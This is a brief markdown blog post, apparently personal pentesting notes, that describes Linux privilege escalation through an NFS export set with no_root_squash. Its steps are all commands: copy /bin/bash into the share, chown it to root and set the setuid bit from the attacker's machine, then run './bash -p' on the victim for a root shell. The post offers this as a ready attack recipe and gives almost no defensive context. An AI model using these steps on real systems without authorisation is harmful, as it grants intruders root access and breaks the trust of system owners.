---
layout: post
title: NFS no_root_squash
description: NFS no_root_squash
summary: NFS no_root_squash
tags: [linux,privesc,nfs]
minute: 1
---
## Overview
If an NFS export contains `no_root_squash` option, attacker can mount that export on his machine and modify any file acting as root user.

## Steps
* Mount share on attacker machine
* Inside victim machine, copy `/bin/bash`

```bash
# e.g /home/james is an NFS export
cd /home/james
cp /bin/bash .
```

* From attacker machine

```bash
cd /mnt
sudo chown root:root bash
sudo chmod u+s bash
```

* Back to victim machine,

```bash
./bash -p
# enjoy!
```
